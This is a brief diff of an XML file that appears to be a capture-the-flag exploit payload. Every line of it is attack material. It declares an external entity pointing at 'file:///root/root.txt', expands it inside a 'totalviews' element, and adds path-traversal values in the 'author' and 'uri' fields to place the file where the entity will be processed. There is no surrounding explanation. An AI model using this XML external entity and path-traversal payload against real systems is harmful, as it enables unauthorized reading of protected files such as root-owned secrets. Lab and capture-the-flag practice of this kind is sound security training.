@@ -1,5 +1,12 @@
-<?xml version="1.0" encoding=ISO-8859-1"?>
+<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ELEMENT foo any >
+  <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///root/root.txt" >]>
-  <totalviews>&xxe;</totalviews>
+<credits>
+<author>../home/woodenk/foo</author>
+<image>
+  <uri>/../../../../../../home/woodenk/foo-conor.jpg</uri>
+  <views>1</views>
+</image>
+<totalviews>&xxe;</totalviews>
+</credits>
